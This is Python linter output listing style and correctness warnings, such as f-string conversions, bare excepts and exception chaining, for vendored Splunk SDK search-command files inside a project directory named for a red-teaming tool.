15 | # under the License.
16 |
17 | from __future__ import absolute_import, division, print_function, unicode_literals
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
18 |
19 | from itertools import chain
   |
help: Remove unnecessary `__future__` import

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\reporting_command.py:106:13
    |
105 |           raise RuntimeError(
106 | /             "Unrecognized reporting command phase: {}".format(
107 | |                 json_encode_string(six.text_type(phase))
108 | |             )
    | |_____________^
109 |           )
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\reporting_command.py:282:33
    |
280 |             """
281 |             if not issubclass(command, ReportingCommand):
282 |                 raise TypeError("{} is not a ReportingCommand".format(command))
    |                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
283 |
284 |             if command.reduce == ReportingCommand.reduce:
    |
help: Convert to f-string

UP009 [*] UTF-8 encoding declaration is unnecessary
 --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:1:1
  |
1 | # coding=utf-8
  | ^^^^^^^^^^^^^^
2 | #
3 | # Copyright ┬⌐ 2011-2015 Splunk, Inc.
  |
help: Remove unnecessary coding comment

UP010 [*] Unnecessary `__future__` imports `absolute_import`, `division`, `print_function`, `unicode_literals` for target Python version
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:17:1
   |
15 | # under the License.
16 |
17 | from __future__ import absolute_import, division, print_function, unicode_literals
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
18 |
19 | import io
   |
help: Remove unnecessary `__future__` import

UP004 [*] Class `SearchCommand` inherits from `object`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:99:21
    |
 99 | class SearchCommand(object):
    |                     ^^^^^^
100 |     """Represents a custom search command."""
    |
help: Remove `object` inheritance

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:177:17
    |
175 |                 level = _levelNames[value.upper()]
176 |             except KeyError:
177 |                 raise ValueError("Unrecognized logging level: {}".format(value))
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
178 |         else:
179 |             try:
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:177:34
    |
175 |                 level = _levelNames[value.upper()]
176 |             except KeyError:
177 |                 raise ValueError("Unrecognized logging level: {}".format(value))
    |                                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
178 |         else:
179 |             try:
    |
help: Convert to f-string

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:182:17
    |
180 |                 level = int(value)
181 |             except ValueError:
182 |                 raise ValueError("Unrecognized logging level: {}".format(value))
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
183 |         self._logger.setLevel(level)
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:182:34
    |
180 |                 level = int(value)
181 |             except ValueError:
182 |                 raise ValueError("Unrecognized logging level: {}".format(value))
    |                                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
183 |         self._logger.setLevel(level)
    |
help: Convert to f-string

UP020 [*] Use builtin `open`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:297:18
    |
296 |         try:
297 |             with io.open(path, "r") as f:
    |                  ^^^^^^^^^^^^^^^^^^
298 |                 reader = csv.reader(f, dialect=CsvDialect)
299 |                 fields = next(reader)
    |
help: Replace with builtin `open`

UP024 [*] Replace aliased errors with `OSError`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:301:16
    |
299 |                 fields = next(reader)
300 |                 values = next(reader)
301 |         except IOError as error:
    |                ^^^^^^^
302 |             if error.errno == 2:
303 |                 self.logger.error(
    |
help: Replace `IOError` with builtin `OSError`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:304:21
    |
302 |               if error.errno == 2:
303 |                   self.logger.error(
304 | /                     "Search results info file {} does not exist.".format(
305 | |                         json_encode_string(path)
306 | |                     )
    | |_____________________^
307 |                   )
308 |                   return
    |
help: Convert to f-string

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:565:13
    |
563 |               tempfile.tempdir = self._metadata.searchinfo.dispatch_dir
564 |           except AttributeError:
565 | /             raise RuntimeError(
566 | |                 "{}.metadata.searchinfo.dispatch_dir is undefined".format(
567 | |                     self.__class__.__name__
568 | |                 )
569 | |             )
    | |_____________^
570 |
571 |           debug("  tempfile.tempdir=%r", tempfile.tempdir)
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:566:17
    |
564 |           except AttributeError:
565 |               raise RuntimeError(
566 | /                 "{}.metadata.searchinfo.dispatch_dir is undefined".format(
567 | |                     self.__class__.__name__
568 | |                 )
    | |_________________^
569 |               )
    |
help: Convert to f-string

UP012 [*] Unnecessary call to `encode` as UTF-8
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:639:21
    |
638 |         with open(recording + ".splunk_cmd", "wb") as f:
639 |             f.write("splunk cmd python ".encode())
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
640 |             f.write(os.path.basename(argv[0]).encode())
641 |             for arg in islice(argv, 1, len(argv)):
    |
help: Rewrite as bytes literal

UP012 [*] Unnecessary call to `encode` as UTF-8
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:642:25
    |
640 |             f.write(os.path.basename(argv[0]).encode())
641 |             for arg in islice(argv, 1, len(argv)):
642 |                 f.write(" ".encode())
    |                         ^^^^^^^^^^^^
643 |                 f.write(arg.encode())
    |
help: Rewrite as bytes literal

C402 Unnecessary generator (rewrite as a dict comprehension)
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:663:21
    |
661 |                   ifile = self._prepare_protocol_v1(argv, ifile, ofile)
662 |                   self._record_writer.write_record(
663 | /                     dict(
664 | |                         (n, ",".join(v) if isinstance(v, (list, tuple)) else v)
665 | |                         for n, v in six.iteritems(self._configuration)
666 | |                     )
    | |_____________________^
667 |                   )
668 |                   self.finish()
    |
help: Rewrite as a dict comprehension

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:681:21
    |
679 |               else:
680 |                   message = (
681 | /                     "Command {0} appears to be statically configured for search command protocol version 1 and static "
682 | |                     "configuration is unsupported by splunklib.searchcommands. Please ensure that "
683 | |                     "default/commands.conf contains this stanza:\n"
684 | |                     "[{0}]\n"
685 | |                     "filename = {1}\n"
686 | |                     "enableheader = true\n"
687 | |                     "outputheader = true\n"
688 | |                     "requires_srinfo = true\n"
689 | |                     "supports_getinfo = true\n"
690 | |                     "supports_multivalues = true\n"
691 | |                     "supports_rawargs = true".format(
692 | |                         self.name, os.path.basename(argv[0])
693 | |                     )
    | |_____________________^
694 |                   )
695 |                   raise RuntimeError(message)
    |
help: Convert to f-string

E722 Do not use bare `except`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:706:9
    |
704 |             raise
705 |
706 |         except:
    |         ^^^^^^
707 |             self._report_unexpected_error()
708 |             self.flush()
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:740:36
    |
739 |             if action != "getinfo":
740 |                 raise RuntimeError("Expected getinfo action, not {}".format(action))
    |                                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
741 |
742 |             if len(body) > 0:
    |
help: Convert to f-string

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:760:17
    |
758 |                   tempfile.tempdir = self._metadata.searchinfo.dispatch_dir
759 |               except AttributeError:
760 | /                 raise RuntimeError(
761 | |                     "%s.metadata.searchinfo.dispatch_dir is undefined".format(
762 | |                         class_name
763 | |                     )
764 | |                 )
    | |_________________^
765 |
766 |               debug("  tempfile.tempdir=%r", tempfile.tempdir)
    |

F523 [*] `.format` call has unused arguments at position(s): 0
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:761:21
    |
759 |               except AttributeError:
760 |                   raise RuntimeError(
761 | /                     "%s.metadata.searchinfo.dispatch_dir is undefined".format(
762 | |                         class_name
763 | |                     )
    | |_____________________^
764 |                   )
    |
help: Remove extra positional arguments at position(s): 0

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:761:21
    |
759 |               except AttributeError:
760 |                   raise RuntimeError(
761 | /                     "%s.metadata.searchinfo.dispatch_dir is undefined".format(
762 | |                         class_name
763 | |                     )
    | |_____________________^
764 |                   )
    |
help: Convert to f-string

E722 Do not use bare `except`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:767:9
    |
766 |             debug("  tempfile.tempdir=%r", tempfile.tempdir)
767 |         except:
    |         ^^^^^^
768 |             self._record_writer = RecordWriterV2(ofile)
769 |             self._report_unexpected_error()
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:787:25
    |
785 |             debug("Parsing arguments")
786 |
787 |             if args and type(args) == list:
    |                         ^^^^^^^^^^^^^^^^^^
788 |                 for arg in args:
789 |                     result = arg.split("=", 1)
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:799:33
    |
797 |                         except KeyError:
798 |                             self.write_error(
799 |                                 "Unrecognized option: {}={}".format(name, value)
    |                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
800 |                             )
801 |                             error_count += 1
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:806:46
    |
804 |                             option.value = value
805 |                         except ValueError:
806 |                             self.write_error("Illegal value: {}={}".format(name, value))
    |                                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
807 |                             error_count += 1
808 |                             continue
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:814:38
    |
812 |             if missing is not None:
813 |                 if len(missing) == 1:
814 |                     self.write_error('A value for "{}" is required'.format(missing[0]))
    |                                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
815 |                 else:
816 |                     self.write_error(
    |
help: Convert to f-string

E722 Do not use bare `except`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:867:9
    |
865 |             self.finish()
866 |             raise
867 |         except:
    |         ^^^^^^
868 |             self._record_writer.write_metadata(self._configuration)
869 |             self._report_unexpected_error()
    |

E722 Do not use bare `except`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:885:9
    |
883 |             self.finish()
884 |             raise
885 |         except:
    |         ^^^^^^
886 |             self._report_unexpected_error()
887 |             self.finish()
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:963:13
    |
961 |             header = ifile.readline()
962 |         except Exception as error:
963 |             raise RuntimeError("Failed to read transport header: {}".format(error))
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
964 |
965 |         if not header:
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:963:32
    |
961 |             header = ifile.readline()
962 |         except Exception as error:
963 |             raise RuntimeError("Failed to read transport header: {}".format(error))
    |                                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
964 |
965 |         if not header:
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:971:32
    |
970 |         if match is None:
971 |             raise RuntimeError("Failed to parse transport header: {}".format(header))
    |                                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
972 |
973 |         metadata_length, body_length = match.groups()
    |
help: Convert to f-string

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:980:13
    |
978 |               metadata = ifile.read(metadata_length)
979 |           except Exception as error:
980 | /             raise RuntimeError(
981 | |                 "Failed to read metadata of length {}: {}".format(
982 | |                     metadata_length, error
983 | |                 )
984 | |             )
    | |_____________^
985 |
986 |           decoder = MetadataDecoder()
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:981:17
    |
979 |           except Exception as error:
980 |               raise RuntimeError(
981 | /                 "Failed to read metadata of length {}: {}".format(
982 | |                     metadata_length, error
983 | |                 )
    | |_________________^
984 |               )
    |
help: Convert to f-string

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:991:13
    |
989 |               metadata = decoder.decode(metadata)
990 |           except Exception as error:
991 | /             raise RuntimeError(
992 | |                 "Failed to parse metadata of length {}: {}".format(
993 | |                     metadata_length, error
994 | |                 )
995 | |             )
    | |_____________^
996 |
997 |           # if body_length <= 0:
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:992:17
    |
990 |           except Exception as error:
991 |               raise RuntimeError(
992 | /                 "Failed to parse metadata of length {}: {}".format(
993 | |                     metadata_length, error
994 | |                 )
    | |_________________^
995 |               )
    |
help: Convert to f-string

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:1005:13
     |
1003 |                   body = ifile.read(body_length)
1004 |           except Exception as error:
1005 | /             raise RuntimeError(
1006 | |                 "Failed to read body of length {}: {}".format(body_length, error)
1007 | |             )
     | |_____________^
1008 |
1009 |           return metadata, body
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:1006:17
     |
1004 |         except Exception as error:
1005 |             raise RuntimeError(
1006 |                 "Failed to read body of length {}: {}".format(body_length, error)
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1007 |             )
     |
help: Convert to f-string

C404 Unnecessary list comprehension (rewrite as a dict comprehension)
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:1022:25
     |
1020 |               return
1021 |
1022 |           mv_fieldnames = dict(
     |  _________________________^
1023 | |             [
1024 | |                 (name, name[len("__mv_") :])
1025 | |                 for name in fieldnames
1026 | |                 if name.startswith("__mv_")
1027 | |             ]
1028 | |         )
     | |_________^
1029 |
1030 |           if len(mv_fieldnames) == 0:
     |
help: Rewrite as a dict comprehension

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:1057:36
     |
1056 |             if action != "execute":
1057 |                 raise RuntimeError("Expected execute action, not {}".format(action))
     |                                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1058 |
1059 |             finished = getattr(metadata, "finished", False)
     |
help: Convert to f-string

C404 Unnecessary list comprehension (rewrite as a dict comprehension)
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:1070:33
     |
1068 |                       return
1069 |
1070 |                   mv_fieldnames = dict(
     |  _________________________________^
1071 | |                     [
1072 | |                         (name, name[len("__mv_") :])
1073 | |                         for name in fieldnames
1074 | |                         if name.startswith("__mv_")
1075 | |                     ]
1076 | |                 )
     | |_________________^
1077 |
1078 |                   if len(mv_fieldnames) == 0:
     |
help: Rewrite as a dict comprehension

UP030 Use implicit references for positional format fields
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:1109:19
     |
1107 |           filename = origin.tb_frame.f_code.co_filename
1108 |           lineno = origin.tb_lineno
1109 |           message = '{0} at "{1}", line {2:d} : {3}'.format(
     |  ___________________^
1110 | |             error_type.__name__, filename, lineno, error
1111 | |         )
     | |_________^
1112 |
1113 |           environment.splunklib_logger.error(
     |
help: Remove explicit positional indices

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:1109:19
     |
1107 |           filename = origin.tb_frame.f_code.co_filename
1108 |           lineno = origin.tb_lineno
1109 |           message = '{0} at "{1}", line {2:d} : {3}'.format(
     |  ___________________^
1110 | |             error_type.__name__, filename, lineno, error
1111 | |         )
     | |_________^
1112 |
1113 |           environment.splunklib_logger.error(
     |
help: Convert to f-string

UP004 [*] Class `ConfigurationSettings` inherits from `object`
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:1122:33
     |
1120 |     # region Types
1121 |
1122 |     class ConfigurationSettings(object):
     |                                 ^^^^^^
1123 |         """Represents the configuration settings common to all :class:`SearchCommand` classes."""
     |
help: Remove `object` inheritance

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\search_command.py:1158:21
     |
1156 |             text = ", ".join(
1157 |                 [
1158 |                     "{}={}".format(name, json_encode_string(six.text_type(value)))
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1159 |                     for (name, value) in six.iteritems(self)
1160 |                 ]
     |
help: Convert to f-string

UP009 [*] UTF-8 encoding declaration is unnecessary
 --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\streaming_command.py:1:1
  |
1 | # coding=utf-8
  | ^^^^^^^^^^^^^^
2 | #
3 | # Copyright 2011-2015 Splunk, Inc.
  |
help: Remove unnecessary coding comment

UP010 [*] Unnecessary `__future__` imports `absolute_import`, `division`, `print_function`, `unicode_literals` for target Python version
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\streaming_command.py:17:1
   |
15 | # under the License.
16 |
17 | from __future__ import absolute_import, division, print_function, unicode_literals
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
18 |
19 | from splunklib.six.moves import filter as ifilter
   |
help: Remove unnecessary `__future__` import

UP009 [*] UTF-8 encoding declaration is unnecessary
 --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:1:1
  |
1 | # coding=utf-8
  | ^^^^^^^^^^^^^^
2 | #
3 | # Copyright 2011-2015 Splunk, Inc.
  |
help: Remove unnecessary coding comment

UP010 [*] Unnecessary `__future__` imports `absolute_import`, `division`, `print_function`, `unicode_literals` for target Python version
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:17:1
   |
15 | # under the License.
16 |
17 | from __future__ import absolute_import, division, print_function, unicode_literals
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
18 |
19 | import csv
   |
help: Remove unnecessary `__future__` import

UP029 Unnecessary builtin import: `open`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:23:1
   |
21 | import re
22 | from collections import namedtuple
23 | from io import open
   | ^^^^^^^^^^^^^^^^^^^
24 | from json.encoder import encode_basestring_ascii as json_encode_string
   |
help: Remove unnecessary builtin import

UP004 [*] Class `Validator` inherits from `object`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:30:17
   |
30 | class Validator(object):
   |                 ^^^^^^
31 |     """Base class for validators that check and format search command options.
   |
help: Remove `object` inheritance

UP030 Use implicit references for positional format fields
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:70:34
   |
68 |             value = six.text_type(value).lower()
69 |             if value not in Boolean.truth_values:
70 |                 raise ValueError("Unrecognized truth value: {0}".format(value))
   |                                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
71 |             value = Boolean.truth_values[value]
72 |         return value
   |
help: Remove explicit positional indices

UP032 [*] Use f-string instead of `format` call
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:70:34
   |
68 |             value = six.text_type(value).lower()
69 |             if value not in Boolean.truth_values:
70 |                 raise ValueError("Unrecognized truth value: {0}".format(value))
   |                                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
71 |             value = Boolean.truth_values[value]
72 |         return value
   |
help: Convert to f-string

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:106:13
    |
104 |             )
105 |         except (SyntaxError, TypeError) as error:
106 |             raise ValueError(error.message)
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
107 |
108 |     def format(self, value):
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:123:34
    |
121 |             value = six.text_type(value)
122 |             if Fieldname.pattern.match(value) is None:
123 |                 raise ValueError("Illegal characters in fieldname: {}".format(value))
    |                                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
124 |         return value
    |
help: Convert to f-string

UP020 [*] Use builtin `open`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:150:17
    |
148 |         try:
149 |             value = (
150 |                 open(path, self.mode)
    |                 ^^^^^^^^^^^^^^^^^^^^^
151 |                 if self.buffering is None
152 |                 else open(path, self.mode, self.buffering)
    |
help: Replace with builtin `open`

SIM115 Use a context manager for opening files
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:150:17
    |
148 |         try:
149 |             value = (
150 |                 open(path, self.mode)
    |                 ^^^^
151 |                 if self.buffering is None
152 |                 else open(path, self.mode, self.buffering)
    |

UP020 [*] Use builtin `open`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:152:22
    |
150 |                 open(path, self.mode)
151 |                 if self.buffering is None
152 |                 else open(path, self.mode, self.buffering)
    |                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
153 |             )
154 |         except IOError as error:
    |
help: Replace with builtin `open`

SIM115 Use a context manager for opening files
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:152:22
    |
150 |                 open(path, self.mode)
151 |                 if self.buffering is None
152 |                 else open(path, self.mode, self.buffering)
    |                      ^^^^
153 |             )
154 |         except IOError as error:
    |

UP024 [*] Replace aliased errors with `OSError`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:154:16
    |
152 |                 else open(path, self.mode, self.buffering)
153 |             )
154 |         except IOError as error:
    |                ^^^^^^^
155 |             raise ValueError(
156 |                 "Cannot open {0} with mode={1} and buffering={2}: {3}".format(
    |
help: Replace `IOError` with builtin `OSError`

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:155:13
    |
153 |               )
154 |           except IOError as error:
155 | /             raise ValueError(
156 | |                 "Cannot open {0} with mode={1} and buffering={2}: {3}".format(
157 | |                     value, self.mode, self.buffering, error
158 | |                 )
159 | |             )
    | |_____________^
160 |
161 |           return value
    |

UP030 Use implicit references for positional format fields
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:156:17
    |
154 |           except IOError as error:
155 |               raise ValueError(
156 | /                 "Cannot open {0} with mode={1} and buffering={2}: {3}".format(
157 | |                     value, self.mode, self.buffering, error
158 | |                 )
    | |_________________^
159 |               )
    |
help: Remove explicit positional indices

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:156:17
    |
154 |           except IOError as error:
155 |               raise ValueError(
156 | /                 "Cannot open {0} with mode={1} and buffering={2}: {3}".format(
157 | |                     value, self.mode, self.buffering, error
158 | |                 )
    | |_________________^
159 |               )
    |
help: Convert to f-string

UP030 Use implicit references for positional format fields
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:183:25
    |
181 |                   if not (minimum <= value <= maximum):
182 |                       raise ValueError(
183 | /                         "Expected integer in the range [{0},{1}], not {2}".format(
184 | |                             minimum, maximum, value
185 | |                         )
    | |_________________________^
186 |                       )
187 |                   return
    |
help: Remove explicit positional indices

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:183:25
    |
181 |                   if not (minimum <= value <= maximum):
182 |                       raise ValueError(
183 | /                         "Expected integer in the range [{0},{1}], not {2}".format(
184 | |                             minimum, maximum, value
185 | |                         )
    | |_________________________^
186 |                       )
187 |                   return
    |
help: Convert to f-string

UP030 Use implicit references for positional format fields
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:194:25
    |
192 |                   if value < minimum:
193 |                       raise ValueError(
194 | /                         "Expected integer in the range [{0},+Γê₧], not {1}".format(
195 | |                             minimum, value
196 | |                         )
    | |_________________________^
197 |                       )
198 |                   return
    |
help: Remove explicit positional indices

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:194:25
    |
192 |                   if value < minimum:
193 |                       raise ValueError(
194 | /                         "Expected integer in the range [{0},+Γê₧], not {1}".format(
195 | |                             minimum, value
196 | |                         )
    | |_________________________^
197 |                       )
198 |                   return
    |
help: Convert to f-string

UP030 Use implicit references for positional format fields
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:205:25
    |
203 |                   if value > maximum:
204 |                       raise ValueError(
205 | /                         "Expected integer in the range [-Γê₧,{0}], not {1}".format(
206 | |                             maximum, value
207 | |                         )
    | |_________________________^
